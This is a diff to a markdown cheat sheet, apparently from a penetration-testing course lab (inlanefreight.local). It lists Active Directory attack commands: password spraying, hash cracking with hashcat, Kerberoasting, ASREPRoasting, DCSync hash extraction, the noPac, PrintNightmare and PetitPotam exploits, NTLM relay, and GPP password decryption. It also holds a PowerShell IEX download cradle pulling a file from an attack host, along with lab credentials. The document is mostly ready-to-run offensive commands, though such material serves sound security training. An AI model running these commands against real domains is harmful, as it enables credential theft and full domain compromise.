@@ -1,8 +1,6 @@
 # Initial Enumeration 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `nslookup ns1.inlanefreight.com`                             | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
 | `sudo tcpdump -i ens224`                                     | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host. |
 | `sudo responder -I ens224 -A`                                | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host |
@@ -16,27 +14,9 @@
 | `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |
 
 
-
-# LLMNR/NTB-NS Poisoning 
-
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
-| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
-| `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
-| `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
-| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
-| `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
-| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |
-
-
-
 # Password Spraying & Password Policies
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Used `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
 | `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
 | `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host.|
@@ -64,8 +44,6 @@
 # Credentialed Enumeration 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
 | `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |
 | `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |
@@ -86,8 +64,6 @@
 # Enumeration by Living Off the Land
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Get-Module`                                                 | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
 | `Import-Module ActiveDirectory`                              | Loads the `Active Directory` PowerShell module from a Windows-based host. |
 | `Get-ADDomain`                                               | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
@@ -132,8 +108,6 @@
 # Transfering Files
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `sudo python3 -m http.server 8001`                           | Starts a python web server for quick hosting of files. Performed from a Linux-basd host. |
 | `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
 | `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host. |
@@ -143,8 +117,6 @@
 # Kerberoasting 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `sudo python3 -m pip install .`                              | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
 | `GetUserSPNs.py -h`                                          | Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host. |
 | `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host. |
@@ -179,8 +151,6 @@
 # ACL Enumeration & Tactics 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Find-InterestingDomainAcl`                                  | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
 | `Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley` | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host. |
 | `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host. |
@@ -204,8 +174,6 @@
 # DCSync 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |
 | `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
 | `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
@@ -216,8 +184,6 @@
 # Privileged Access 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
 | `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
 | `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. |
@@ -238,8 +204,6 @@
 # NoPac
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `sudo git clone https://github.com/Ridter/noPac.git`         | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |
 | `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |
 | `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |
@@ -250,8 +214,6 @@
 # PrintNightmare
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `git clone https://github.com/cube0x0/CVE-2021-1675.git`     | Used to clone a PrintNightmare exploit  using git from a Linux-based host. |
 | `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
 | `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`            | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host. |
@@ -264,8 +226,6 @@
 # PetitPotam
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |
 | `git clone https://github.com/topotam/PetitPotam.git`        | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |
 | `python3 PetitPotam.py 172.16.5.225 172.16.5.5`              | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
@@ -282,8 +242,6 @@
 # Miscellaneous Misconfigurations
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Import-Module .\SecurityAssessment.ps1`                     | Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host. |
 | `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host. |
 | `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`      | Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host. |
@@ -295,8 +253,6 @@
 # Group Policy Enumeration & Attacks
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`    | Tool used to decrypt a captured `group policy preference password` from a Linux-based host. |
 | `crackmapexec smb -L \| grep gpp`                              | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host. |
 | `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host. |
@@ -311,8 +267,6 @@
 # ASREPRoasting
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host. |
 | `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host. |
 | `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt ` | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host. |
@@ -323,8 +277,6 @@
 # Trust Relationships - Child > Parent Trusts 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Import-Module activedirectory`                              | Used to import the `Active Directory` module. Performed from a Windows-based host. |
 | `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
 | `Get-DomainTrust `                                           | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
@@ -351,8 +303,6 @@
 # Trust Relationships - Cross-Forest 
 
 | Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host. |
 | `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host. || ------------------------------------------------------------ | ------------------------------------------------------------ |
 | ` .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host. |
